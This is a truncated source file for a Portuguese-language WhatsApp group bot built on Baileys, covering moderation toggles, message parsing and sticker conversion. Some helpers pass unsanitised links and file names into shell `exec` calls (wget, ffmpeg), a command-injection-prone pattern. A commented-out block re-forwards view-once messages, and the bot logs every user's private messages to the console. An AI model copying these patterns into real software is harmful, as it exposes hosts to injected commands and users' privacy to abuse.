
//======================================


require("./config")

const {
 BufferJSON, 
WA_DEFAULT_EPHEMERAL, 
downloadContentFromMessage, 
delay,
useSingleFileAuthState, 
generateWAMessageFromContent, 
proto, 
generateWAMessageContent, 
WAProto, 
Presence,
generateWAMessage, 
prepareWAMessageMedia, 
areJidsSameUser, 
getContentType, 
WAFlag 
} = require('@adiwajshing/baileys')


const zmans = require("@adiwajshing/baileys")
const uber = require('uberduck-api')
const fs = require('fs')
const yts = require('yt-search');
const util = require('util')
const chalk = require('chalk')
const { exec, spawn, execSync } = require("child_process")
const axios = require('axios')
const ffmpeg = require('fluent-ffmpeg');
const xa = require('xfarr-api')
const { Youtube } = require('ytdownloader.js')

const { mediafire } = require('./funções de cmd/funções/mediafire')

const {  imageToWebp, videoToWebp, writeExifImg, writeExifVid } = require('./funções/exif') 

const { pornok, hentai } = require('./funções de cmd/funções/scraper')

const webp_mp4 = require("./funções de cmd/funções/webp_mp4.js");

const { validmove, setGame } = require('./funções de cmd/tictactoe');

const execute = util.promisify(require('child_process').exec)

const { pinterest } = require("./funções de cmd/funções/pinterest")

const { wallpaper } = require("./funções de cmd/funções/wallpaper")

const anime = JSON.parse(fs.readFileSync('./funções de cmd/funções/anime.json'))

const antiracismo = JSON.parse(fs.readFileSync('./funções de cmd/antis/antiracismo.json'))

const sotoy = JSON.parse(fs.readFileSync('./funções de cmd/funções/sotoy.json'));

const autoreact = JSON.parse(fs.readFileSync('./funções de cmd/funções/autoreact.json'))

const { palavrasANA } = require('./funções de cmd/funções/jogos.js');

const { infobemvindo } = require('./funções de cmd/funções/infobv.js');

const welcome_group2 = JSON.parse(fs.readFileSync('./funções de cmd/grupos/welcomegp2.json'));

const bye_group2 = JSON.parse(fs.readFileSync('./funções de cmd/grupos/byegp2.json'));

const welkom = JSON.parse(fs.readFileSync('./funções de cmd/grupos/welkom.json'));

const registros = JSON.parse(fs.readFileSync('./registros.json'));

const { TelegraPh } = require("./funções/uploader");


//=====================================
const xfar = require('xfarr-api');
const path = require('path')
const fetch = require('node-fetch')
const os = require('os')
 const { TiktokDownloader } = require('./funções/tiktokdl') 
const moment = require('moment-timezone')
const { JSDOM } = require('jsdom')
const speed = require('performance-now')
const hx = require('./funções/hxz-api')
const { TiktokDownloaderr } = require('./funções/tiktokmikudl');
const stalker = require("xzons-api")
const hxz = require('./funções/hxz-api')
const { Aki } = require('aki-api')
const { insert, response } = require('./funções de cmd/funções/simi.js');

//=====================================
const welkom2 = JSON.parse(fs.readFileSync('./funções de cmd/usuarios/vacilo.json'));

const { color, bgcolor } = require('./funções/color')

const { convertSticker } = require("./funções de cmd/funções/swm.js");

const tamat = JSON.parse(fs.readFileSync('./funções de cmd/funções/tamat.json'))

const countMessage = JSON.parse(fs.readFileSync('./funções de cmd/grupos/countmsg.json'));

const { conselhob } = require('./funções de cmd/funções/conselhob.js');

const { palavras } = require('./funções de cmd/funções/conselhos.js');

const { mediafireDl } = require('./funções/mediafire')

const adeuscara = JSON.parse(fs.readFileSync('./funções de cmd/grupos/adeuscara.json'));

//==========DIRETORIO DOS MENUS =============

const { menu } = require("./funções de cmd/menu/menu.js")

const { menudono } = require("./funções de cmd/menu/menudono.js")

const { menulogos } = require('./funções de cmd/menu/menulogos.js');

const { infodono } = require('./funções de cmd/menu/infodono.js');

const { menuadm } = require("./funções de cmd/menu/menuadm.js")

const { menuprem } = require('./funções de cmd/menu/menuprem.js');

const { alteradores } = require('./funções de cmd/menu/alteradores.js');

const { brincadeiras } = require('./funções de cmd/menu/brincadeiras.js');

const { sticker } = require('./funções de cmd/menu/sticker.js');

const { menuhentai } = require('./funções de cmd/menu/hentai.js');

//=====================================

const { EmojiAPI } = require("emoji-api")
const imgbbUploader = require('imgbb-uploader')
const { isLimit,  getLimit, giveLimit, addBalance, kurangBalance, getBalance, isGame, gameAdd, givegame, cekGLimit } = require('./funções/limit.js');
const emoji = new EmojiAPI()
const usedCommandRecently = new Set()
const { getLevelingXp, getLevelingLevel, getLevelingId, Telesticker, addLevelingXp, addLevelingLevel, addLevelingId, smsg, tanggal, getExtension, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getGroupAdmins,  getRandom } = require('./funções/myfunc')
const { aiovideodl } = require('./funções/scraper.js')
const cheerio = require ("cheerio");
const textpro = require('./funções/textpro')
const mimetype = require('mime-types')
const { segunPRONTOws } = require('./funções/segundo')
const { wikiSearch } = require('./funções/wiki.js');
const premium = JSON.parse(fs.readFileSync('./funções de cmd/usuarios/premium.json'));
const { upload, nit } = require('./funções de cmd/funções/tourl');

const { forwarding, imgnazista, imggay, imgcorno, imggostosa, imggostoso, imgfeio, imgvesgo, imgbebado, imggado, matarcmd, beijocmd, chutecmd, tapacmd } = require("./funções de cmd/nescessario.json")

//=====================================

const ms = require('ms')
 let { covid } = require('./funções/covid.js') 
const { yta,  ytv, searchResult  } = require('./funções/ytdl')
 
const forca = JSON.parse(fs.readFileSync('./funções/database/forca.json'))
const puppet = JSON.parse(fs.readFileSync('./funções/database/puppet_forca.json'))

//===================================== 
 
fake = "AQUA ZIKA"


lolkey = global.lolhuman

keyapi = "key-licht-san-7" // https://manuella-api-pl.herokuapp.com

tohkapi = "Lichtzin" // https://tohka.tech

//===================================== 
 
var prefix = global.prefix 

NomeDoBot = global.NomeDoBot

numerodn = global.numerodonoa   

NickDono = global.NickDono

banChats = global.banChats 

logo = global.log0

//===================================== 
 
let picaks = ['flamejante','flaming','flarun','flasmurf']
let picak = picaks[Math.floor(Math.random() * picaks.length)]

const meupirul = ['Hoje', 'Amanhã', 'Nunca', 'dia', 'semana', 'mês', 'ano']
const meupirul2 = ['dias', 'semanas', 'meses', 'anos']

//========CONST=============\\

const nsfw = JSON.parse(fs.readFileSync('./funções de cmd/grupos/nsfw.json'));

const { destrava, destrava2 } = require('./funções de cmd/funções/destrava.js');

const samih = JSON.parse(fs.readFileSync('./funções de cmd/usuarios/simi.json'));

const samih2 = JSON.parse(fs.readFileSync('./funções de cmd/funções/simi.json'));

const akinator = JSON.parse(fs.readFileSync('./funções de cmd/funções/akinator.json'))

let limit = JSON.parse(fs.readFileSync('./jogos-rpg/user/limit.json'));

let leveling = JSON.parse(fs.readFileSync('./funções de cmd/funções/leveling.json'))

let autosticker = JSON.parse(fs.readFileSync('./funções de cmd/funções/autosticker.json'));

const autostick = JSON.parse(fs.readFileSync('./funções de cmd/funções/autostickpc.json'))

let _level = JSON.parse(fs.readFileSync('./funções de cmd/funções/level.json'))

const joguinhodavelhajs = JSON.parse(fs.readFileSync('./funções de cmd/usuarios/joguinhodavelha.json'));

const joguinhodavelhajs2 = JSON.parse(fs.readFileSync('./funções de cmd/usuarios/joguinhodavelha2.json'));

//========COMEÇO ANTIS=============\\


const limitefll = JSON.parse(fs.readFileSync('./funções de cmd/usuarios/flood.json'));

const anticall = JSON.parse(fs.readFileSync('./funções de cmd/usuarios/anticall.json'));

const antifake = JSON.parse(fs.readFileSync('./funções de cmd/antis/antifake.json'))

const antilinkhard = JSON.parse(fs.readFileSync('./funções de cmd/antis/antilinkhard.json'))

const autofigu = JSON.parse(fs.readFileSync('./funções de cmd/grupos/autofigu.json'))

const antilinkgp = JSON.parse(fs.readFileSync('./funções de cmd/antis/antilinkgp.json'))

const antiporn = JSON.parse(fs.readFileSync('./funções de cmd/antis/antiporn.json'))

const antiimg = JSON.parse(fs.readFileSync('./funções de cmd/antis/antiimg.json'))

const antiflood = JSON.parse(fs.readFileSync('./funções de cmd/usuarios/antiflood.json'));

const antisticker = JSON.parse(fs.readFileSync('./funções de cmd/antis/antisticker.json'))

const antinotas = JSON.parse(fs.readFileSync('./funções de cmd/antis/antinotas.json'))

const antictt = JSON.parse(fs.readFileSync('./funções de cmd/antis/antictt.json'))

const anticatalogo = JSON.parse(fs.readFileSync('./funções de cmd/antis/anticatalogo.json'))

const antidoc = JSON.parse(fs.readFileSync('./funções de cmd/antis/antidoc.json'))

const antiloc = JSON.parse(fs.readFileSync('./funções de cmd/antis/antiloc.json'))

const antipv = JSON.parse(fs.readFileSync('./funções de cmd/usuarios/antipv.json'))

const antivid = JSON.parse(fs.readFileSync('./funções de cmd/antis/antivideo.json'))

const antiaudio = JSON.parse(fs.readFileSync('./funções de cmd/antis/antiaudio.json'))

const palavra = JSON.parse(fs.readFileSync('./funções de cmd/grupos/palavras.json'))

const muted = JSON.parse(fs.readFileSync('./funções de cmd/grupos/muted.json'))

const palavrao = JSON.parse(fs.readFileSync('./funções de cmd/grupos/palavrao.json'))



//========COMEÇO=============\\

module.exports = aqua = async (aqua, m, messages, store) => {
try {
const info = messages ? messages[0]: messages[1]
if (!info.message) return 
if (info.key && info.key.remoteJid == 'status@broadcast') return

const altpdf = Object.keys(info.message)
const type = Object.keys(info.message)[0] == 'senderKeyDistributionMessage' ? Object.keys(info.message)[2] : (Object.keys(info.message)[0] == 'messageContextInfo') ? Object.keys(info.message)[1] : Object.keys(info.message)[0]

//==============(BODY)================\\
  var body = (type === 'conversation') ? info.message.conversation : (type == 'imageMessage') ? info.message.imageMessage.caption : (type == 'videoMessage') ? info.message.videoMessage.caption : (type == 'extendedTextMessage') ? info.message.extendedTextMessage.text : (type == 'buttonsResponseMessage') ? info.message.buttonsResponseMessage.selectedButtonId : (type == 'listResponseMessage') ? info.message.listResponseMessage.singleSelectReply.selectedRowId : (type == 'templateButtonReplyMessage') ? info.message.templateButtonReplyMessage.selectedId : (type === 'messageContextInfo') ? (info.message.buttonsResponseMessage?.selectedButtonId || info.message.listResponseMessage?.singleSelectReply.selectedRowId || info.text) : ''
  
const args = body.trim().split(/ +/).slice(1)

const q = args.join(' ')

const isCmd = body.startsWith(prefix)

const command = isCmd ? body.slice(1).trim().split(/ +/).shift().toLocaleLowerCase() : null

//================(BADY)================\\
 
bady = (type === 'conversation') ? info.message.conversation : (type == 'imageMessage') ? info.message.imageMessage.caption : (type == 'videoMessage') ? info.message.videoMessage.caption : (type == 'extendedTextMessage') ? info.message.extendedTextMessage.text : (info.message.listResponseMessage && info.message.listResponseMessage.singleSelectReply.selectedRowId) ? info.message.listResponseMessage.singleSelectReply.selectedRowId: ''

//=======================================\\

bidy =  bady.toLowerCase()
//===============(BUDY)==================\\

budy = (type === 'conversation') ? info.message.conversation : (type === 'extendedTextMessage') ? info.message.extendedTextMessage.text : ''

var budy2 = budy.toLowerCase().normalize('NFD').replace(/[\u0300-\u036f]/g, "");

//======================================\\

var pes = (type === 'conversation' && m.message.conversation) ? m.message.conversation : (type == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (type == 'videoMessage') && m.message.videoMessage.caption ? m.message.videoMessage.caption : (type == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text : ''

//===========(ID DAS FIGUS)===========\\

const figura = Object.keys(m.message)[0] == "stickerMessage" ? m.message.stickerMessage.fileSha256.toString('base64') : ""

//=====================================\\

const listmsg = (from, title, desc, list) => { 
po = aqua.prepareMessageFromContent(from, {"listMessage": {"title": title,"description": desc,"buttonText": "Escolha aqui","footerText": "Selecione","listType": 1,"sections": list}}, {})
return aqua.relayWAMessage(po, {waitForAck: true})
}
listmes = (type == 'listResponseMessage') ? info.message.listResponseMessage.title : ''



//========FORMAÇÕES/CONST)=============\\

const SoDono = [ ...global.numerodonoa].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)

const botNumber = aqua.user.id.split(':')[0]+'@s.whatsapp.net'

const itsMe = m.sender == botNumber ? true : false

const text = args.join(" ")

const from = m.key.remoteJid
const isGroup = from.endsWith('@g.us') 
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''


//========GRUPOS/CONST)=============\\

const groupMetadata = isGroup ? await aqua.groupMetadata(from) : ''
const participants = isGroup ? await groupMetadata.participants : ''
const groupName = isGroup ? groupMetadata.subject : ''
const sender = isGroup ? m.key.participant : m.key.remoteJid
const pushname = m.pushName ? m.pushName : ''

const messagesC = pes.slice(0).trim().split(/ +/).shift().toLowerCase()

const arg = body.substring(body.indexOf(' ') + 1)


const argss = body.split(/ +/g)
const testat = body
const ants = body

const groupDesc = isGroup ? groupMetadata.desc : ''

const groupMembers = isGroup ? groupMetadata.participants : ''

const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''

//=======================================\\



const numerodono = [ ...global.numerodonoa].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)


//============(SORTEIO-CONST)============\\

const isSimi = isGroup ? samih.includes(from) : false

const isSimi2 = isGroup ? samih2.includes(from) : false


//=======(ADMS/DONO/ETC..CONST)========\\

const isNsfw =  isGroup ? nsfw.includes(from) : true

const isBot = m.key.fromMe ? true : false

const isPremium = premium.includes(sender)

const isBotAdmins = groupAdmins.includes(botNumber) || false

const isGroupAdmins = groupAdmins.includes(sender) || false 

const isBotGroupAdmins = groupAdmins.includes(botNumber) || false

//==============================

const welcm = isGroup ? wlcm.includes(from) : true
const GcRvk = isGroup ? gcrevoke.includes(from) : false
const isLevelingOn = isGroup ? leveling.includes(from) : false
const isAutoStick = autostick.includes(from)
const isAutoSticker = isGroup ? autosticker.includes(from) : false

const content = JSON.stringify(m.message)

//================COMEÇO DOS ANTIS======================\\

//===========(ANTIS-PROTEÇÕES)===========\\

const isAntifake = isGroup ? antifake.includes(from) : false

const isRegistro = registros.includes(sender)

const isAntiCtt = isGroup ? antictt.includes(from) : false

const isAnticatalogo = isGroup ? anticatalogo.includes(from) : false

const isAntiFlood = isGroup ? antiflood.includes(from) : false	

const isAntiLinkHard = isGroup ? antilinkhard.includes(from) : false

const isJoguin = isGroup ? joguinhodavelhajs.includes(sender) : false

const isleveling = isGroup ? leveling.includes(from) : false

const isAntilinkgp = isGroup ? antilinkgp.includes(from) : false

const isAntiPorn = isGroup ? antiporn.includes(from) : false

const isAntiAudio = isGroup ? antiaudio.includes(from) : false	
	
const isAntiImg = isGroup ? antiimg.includes(from) : false

const isAntiSticker = isGroup ? antisticker.includes(from) : false

const isAntiNotas = isGroup ? antinotas.includes(from) : false

const Antidoc = isGroup ? antidoc.includes(from) : false

const Antiloc = isGroup ? antiloc.includes(from) : false

const isAntiVid = isGroup ? antivid.includes(from) : false	

const isAutoReact = isGroup ? autoreact.includes(from) : false

const isWelkom2 = isGroup ? welkom2.includes(from) : true

const groupIdWelcomed2 = []	

for(let obj of welcome_group2) groupIdWelcomed2.push(obj.id)

const groupIdBye2 = []

for(let obj of bye_group2) groupIdBye2.push(obj.id)


const isWelcomed2 = (groupIdWelcomed2.indexOf(from) >= 0) ? true : false

const isByed2 = (groupIdBye2.indexOf(from) >= 0) ? true : false	
	

const isAntiPv = (antipv.indexOf('Ativado') >= 0) ? true : false	

const isAnticall = (anticall.indexOf('Ativado') >= 0) ? true : false

const isPalavrao = isGroup ? palavrao.includes(from) : false	

const isViewOnce = (type == 'viewOnceMessage')

const isWelkom = isGroup ? welkom.includes(from) : false

//=======================================\\
 

//=========(isQuoted/consts)=============\\
const isImage = type == 'imageMessage'
const isVideo = type == 'videoMessage'
const isAudio = type == 'audioMessage'
const isSticker = type == 'stickerMessage'
const isContact = type == 'contactMessage'
const isLocation = type == 'locationMessage'
const isProduct = type == 'productMessage'
const isMedia = (type === 'imageMessage' || type === 'videoMessage' || type === 'audioMessage')
typeMessage = body.substr(0, 50).replace(/\n/g, '')
if (isImage) typeMessage = "Image"
else if (isVideo) typeMessage = "Video"
else if (isAudio) typeMessage = "Audio"
else if (isSticker) typeMessage = "Sticker"
else if (isContact) typeMessage = "Contact"
else if (isLocation) typeMessage = "Location"
else if (isProduct) typeMessage = "Product"

const isQuotedMsg = type === 'extendedTextMessage' && content.includes('textMessage')

const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')

const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')

const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')

const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')

const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')

const isQuotedContact = type === 'extendedTextMessage' && content.includes('contactMessage')

const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')

const isQuotedProduct = type === 'extendedTextMessage' && content.includes('productMessage')
             
//==========================================\\

selectedButton = (type == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : ''

//==========================================\\


  const argsButton = selectedButton.trim().split(/ +/)

//==========================================\\

const getFileBuffer = async (mediakey, MediaType) => {
  
const stream = await downloadContentFromMessage(mediakey, MediaType)

let buffer = Buffer.from([])
for await(const chunk of stream) {
buffer = Buffer.concat([buffer, chunk])
}
return buffer
}

 try {
ppimg = await aqua.profilePictureUrl(sender)
 } catch {
ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
 }
const userppbuff = await getBuffer(ppimg) 


const sendSticker = (from, filename, m) => {
aqua.sendMessage(from, {sticker: filename}, {quoted: selo})
}

const sendImage = (ytb) => {
aqua.sendMessage(from, {image: ytb}, {quoted: selo})
}


const sendMess = (hehe, ytb) => {
aqua.sendMessage(hehe, {text: ytb})
}

	const pickRandom = (arr) => {
			return arr[Math.floor(Math.random() * arr.length)]
		}

const mentions = (teks, memberr, id) => {
(id == null || id == undefined || id == false) ? aqua.sendMessage(from, {text: teks.trim(), mentions: memberr}) : aqua.sendMessage(from, {text: teks.trim(), mentions: memberr})
}
	
const costum = (pesan, tipe, target, target2) => {
aqua.sendMessage(from, pesan, tipe, {quoted: {key: {fromMe: false, participant: `${target}`, ...(from ? {remoteJid: from}: {})}, message: {conversation: `${target2}` }}})
}

const sendlistA = async (id, txt1, txt2, title1, btext, but) => {

const sections = but

const listMessage = {
text: txt1,
footer: txt2,
title: title1,
buttonText: btext,
sections
}
aqua.sendMessage(id, listMessage)  
}

//=========HORAS=============

function kyun(seconds){
function pad(s){
return (s < 10 ? '0' : '') + s;
}
var hours = Math.floor(seconds / (60*60));
var minutes = Math.floor(seconds % (60*60) / 60);
var seconds = Math.floor(seconds % 60);
return `${pad(hours)}H ${pad(minutes)}M ${pad(seconds)}S`
}



const time2 = moment().tz('America/Sao_Paulo').format('HH:mm:ss')
if(time2 > "00:00:00"){
var tempo = 'BOA MADRUGADA' 
} 
if(time2 > "05:30:00"){
var tempo = 'BOM DIA' 
}
if(time2 > "12:00:00"){
var tempo = 'BOA TARDE' 
}
if(time2 > "19:00:00"){
var tempo = 'BOA NOITE' 
}



//========CONST DE SELO========================

var selo = {
    key: {
fromMe: false,
"participant": "0@s.whatsapp.net",
"remoteJid": "120363022697760691@g.us"
    },
    "message": {
orderMessage: {
itemCount: 13000,
status: 200,
jpegThumbnail: fs.readFileSync('./mídia-ft-vd/fotos/deusa.jpg'),
surface: 200,
message: `🔹@Licht.Offc\n🔹@AquaBot.Wpp`,
orderTitle: 'AQUA BOT SUPREMACY',
sellerJid: '0@s.whatsapp.net'
}
    },
    contextInfo: {
"forwardingScore": 999,
"isForwarded": true
    },
    sendEphemeral: true
}


const reply = (texto) => {
aqua.sendMessage(from, { text: texto }, {quoted: selo}).catch(e => {
console.log(e)
})
}

//=====================================
     
aqua.createMessage = async (jidnya, kontennya, optionnya) => {
return await generateWAMessage(jidnya, kontennya, {...optionnya,userJid: aqua.authState.creds.me.id,upload: aqua.waUploadToServer})
}

//=====================================


function randomNomor(angka){
return Math.floor(Math.random() * angka) + 1
}


//=============DATA=============

const date = moment.tz('America/Sao_Paulo').format('DD/MM/YY');


const time = moment.tz('America/Sao_Paulo').format('HH:mm:ss');

const hora = moment.tz('America/Sao_Paulo').format('HH:mm:ss');

const dataa = moment.tz('America/Sao_Paulo').format('DD/MM/YY');

//=====================================


//===============INTERAÇÃO NO TERMUX=====================
// ❗𝙲𝙾𝙼𝙰𝙽𝙳𝙾 𝙽𝙾 𝙿𝚅❗
if (!isGroup && isCmd) console.log(
color('[💧] 𝐂𝐎𝐌𝐀𝐍𝐃𝐎 𝐍𝐎 𝐏𝐑𝐈𝐕𝐀𝐃𝐎 [💧]','red'),'\n',
color('⪼ NΙCK :','blue'),color(pushname,'cyan'),'\n',
color('⪼ CМD :','blue'),color(command,'cyan'),'\n',
color('⪼ HORA :','blue'),color(hora,'cyan'),'\n',
color('⪼ DAТA :','blue'),color(dataa,'cyan'),'\n')

// ❗𝙼𝙴𝙽𝚂𝙰𝙶𝙴𝙼 𝙽𝙾 𝙿𝚅❗
if (!isCmd && !isGroup) console.log(
color('[💧] 𝐌𝐄𝐍𝐒𝐀𝐆𝐄𝐌 𝐍𝐎 𝐏𝐑𝐈𝐕𝐀𝐃𝐎 [💧]','red'),'\n',
color('⪼ NICK :','blue'),color(pushname,'cyan'),'\n',
color('⪼ MSG :','blue'),color(budy,'cyan'),'\n',
color('⪼ HORA :','blue'),color(hora,'cyan'),'\n',
color('⪼ DATA :','blue'),color(dataa,'cyan'),'\n')

// ❗𝙲𝙾𝙼𝙰𝙽𝙳𝙾 𝙴𝙼 𝙶𝚁𝚄𝙿𝙾❗
if (isCmd && isGroup) console.log(
color('[💧] 𝐂𝐎𝐌𝐀𝐍𝐃𝐎 𝐄𝐌 𝐆𝐑𝐔𝐏𝐎 [💧]','red'),'\n',
color('⪼ GRUPO :','blue'),color(groupName,'cyan'),'\n',
color('⪼ NICK :','blue'),color(pushname,'cyan'),'\n',
color('⪼ CMD :','blue'),color(command,'cyan'),'\n',
color('⪼ HORA :','blue'),color(hora,'cyan'),'\n',
color('⪼ DATA :','blue'),color(dataa,'cyan'),'\n')

// ❗𝙼𝙴𝙽𝚂𝙰𝙶𝙴𝙼 𝙴𝙼 𝙶𝚁𝚄𝙿𝙾❗
if (!isCmd && isGroup) console.log(
color('[💧] 𝐌𝐄𝐍𝐒𝐀𝐆𝐄𝐌 𝐄𝐌 𝐆𝐑𝐔𝐏𝐎 [💧]','red'),'\n',
color('⪼ GRUPO :','blue'),color(groupName,'cyan'),'\n',
color('⪼ NICK :','blue'),color(pushname,'cyan'),'\n',
color('⪼ MSG :','blue'),color(budy,'cyan'),'\n',
color('⪼ HORA :','blue'),color(hora,'cyan'),'\n',
color('⪼ DATA :','blue'),color(dataa,'cyan'),'\n')


//===================================== 



//=====================================


//===========(enviar.espere)=============\\

const { mensagens } = require('./funções de cmd/funções/aleatoria.js'); // caso queira Alterar ou Adicionar Mais Frases de Espera 

const { sortear } = require('./funções de cmd/funções/aleatoria.js'); // Basta ir Neste Diretório, e Adicionar.

var enviarmen = mensagens[Math.floor(Math.random() * mensagens.length)] 
//========================================\\


//=====================================

enviar = {
espere: `${enviarmen}`,
successo: '️[🌊] SUCESSO',
levelon: '[💧] SISTEMA DE NÍVEL ATIVADO',
leveloff: '[🩸] SISTEMA DE NÍVEL DESATIVADO',
levelnoton: '[💧] SISTEMA NÃO ESTA ATIVO [🩸]',
levelnol: '*error* 0 °-°',
error: {
stick: '*falhou, tente novamente ^_^*',
Iv: '[💠] LINK INVÁLIDO'
},
msg: {
grupo: '[❗] Este comando só pode ser usado em grupos! ❌',
premium: '[❗] ESTE PEDIDO É SO PARA *USUÁRIOS PREMIUMS*',
mod: `[❗] ESTE PEDIDO É ESPECÍFICO PARA USUARIO MOD ${global.NickDono}*`,
banido: '❌ Você foi banido de utilizar os comandos, entre em contato com o proprietário pra saber o porque ❌' ,
donosmt: '[❗] Este é um recurso especial para o proprietário ❌',
donosmt2: '[❗] Este é um recurso especial para o proprietário ❌',
registro: '[💧] Faça Seu Login, Para poder Utilizar Este Comando',
adm: '[❗] Este comando só pode ser usado por administradores de grupo! ❌',
Badmin: ' [❗] Este comando só pode ser usado quando o bot se torna administrador! ❌',
}
}
//=====================================

const sendBtext = async (id, text1, desc1, but = [], vr) => {
buttonMessage = {
text: text1,
footer: desc1,
buttons: but,
headerType: 1
}
aqua.sendMessage(id, buttonMessage, {quoted: vr})
}

//=====================================
    
const enviarbutao = (from, text, footer, buttons) => {
return aqua.sendMessage(from, { text: text, footer: footer, templateButtons: buttons, quoted: selo })
}    

// PRA ENVIAR BOTÃO DE TEMPLATE

const sendBimgT = async (id, img1, text1, desc1, but = [], vr) => {
templateMessage = {
image: {url: img1},
caption: text1,
footer: desc1,
templateButtons: but,
}
aqua.sendMessage(id, templateMessage, {quoted: selo})
}
//====================================

const enviarimg = (imageDir, caption) => {
aqua.sendMessage(from, {
image: fs.readFileSync(imageDir),
caption: caption
})
}

// ENVIAR BOTÃO COM IMAGEM
const sendBimg = async (id, img1, text1, desc1, but = [], vr) => {
buttonMessage = {
image: {url: img1},
caption: text1,
footer: desc1,
buttons: but,
headerType: 4
}
aqua.sendMessage(id, buttonMessage, {quoted: vr})
}
   

//========AUTOFIGU-GP/AUTOFIGU-PV=============

const enviarfigu = async (figu, tag) => {
bla = fs.readFileSync(figu)
aqua.sendMessage(from, {sticker: bla}, {quoted: selo})
}

const enviarfiguUrl = async (link) => {
ranp = getRandom('.gif')
rano = getRandom('.webp')
ini_buffer = `${link}`
exec(`wget ${ini_buffer} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 320:320 ${rano}`, (err) => {
fs.unlinkSync(ranp)
buff = fs.readFileSync(rano)
aqua.sendMessage(from, {sticker: buff}, {quoted: selo}).catch(e => {
})
fs.unlinkSync(rano)
})
}

if(isAutoSticker &&  !m.key.fromMe && isGroup) {
async function autofiguf() {
await setTimeout(async() => {    
if(budy.includes(`${prefix}sticker`) || budy.includes(`${prefix}s`) || budy.includes(`${prefix}stk`) || budy.includes(`${prefix}st`) || budy.includes(`${prefix}fsticker`) || budy.includes(`${prefix}f`) || budy.includes(`${prefix}fstiker`)) return
if(type === "videoMessage") {
if ((isMedia && info.message.videoMessage.seconds < 40)){  
rane = getRandom('.'+await getExtension(info.message.videoMessage.mimetype))
buffimg = await getFileBuffer(info.message.videoMessage, 'video')
fs.writeFileSync(rane, buffimg)
const media = rane
rano = getRandom('.webp')
await ffmpeg(`./${media}`)
.inputFormat(media.split('.')[1])
.on('start', function (cmd) {
console.log(`Started : ${cmd}`)
})
.on('error', function (err) {
console.log(`Error : ${err}`)
exec(`webpmux -set exif ${addMetadata('bot', 'deusa')} ${rano} -o ${rano}`, async (error) => {
fs.unlinkSync(media)
tipe = media.endsWith('.mp4') ? 'video' : 'gif'
reply(`Falha na conversão de ${tipe} para sticker`)
})
})
exec(`ffmpeg -i ${media} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 200:200 ${rano}`, (err) => {
fs.unlinkSync(media)
buffer = fs.readFileSync(rano)
aqua.sendMessage(from, {sticker: buffer}, {quoted: selo})
fs.unlinkSync(rano)
})
} 
}

if(type === "imageMessage") {
rane = getRandom('.'+await getExtension(info.message.imageMessage.mimetype))
buffimg = await getFileBuffer(info.message.imageMessage, 'image')
fs.writeFileSync(rane, buffimg)
const media = rane
rano = getRandom('.webp')
exec(`ffmpeg -i ${media} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 800:800 ${rano}`, (err) => {
fs.unlinkSync(media)
buffer = fs.readFileSync(rano)
aqua.sendMessage(from, {sticker: buffer}, {quoted: selo})
fs.unlinkSync(rano)
})  
}
}, 1000)
}
autofiguf().catch(e => {
console.log(e)
})
}

/*

if (isGroup && !m.key.fromMe && type == 'viewOnceMessage') {
let teks = `「 *ANTI VIEWONCE ATIVADO * 」
    
    🤠 *NOME* : ${pushname}
    👾 *USUÁRIO* : @${sender.split("@")[0]}
    ⏰ *Relógio* : ${moment.tz('America/Sao_Paulo').format('HH:mm:ss')}
    
    💫 *MENSAGEM DENTRO* : ${type}`
reply(teks)
await sleep(500)
m.copyNForward(from, true, {
readViewOnce: true
}, {
quoted: selo
}).catch(_ => reply(`ERROOO`))
}

*/
//=====================================

/*
if (isAutoStick && isGroup) {
     if(type == "imageMessage") {
await aqua.sendImageAsSticker(from, m,    {packname: global.packname, author: global.author })
console.log(`DETECTADO AUTOSTICKER `)
} else if(type == "videoMessage") {
await aqua.sendVideoAsSticker(from, m,  {packname: global.packname, author: global.author })
}
}
*/

//=====================================

if(isAutoReact && isGroup && isCmd) {
if(!isAutoReact) return 
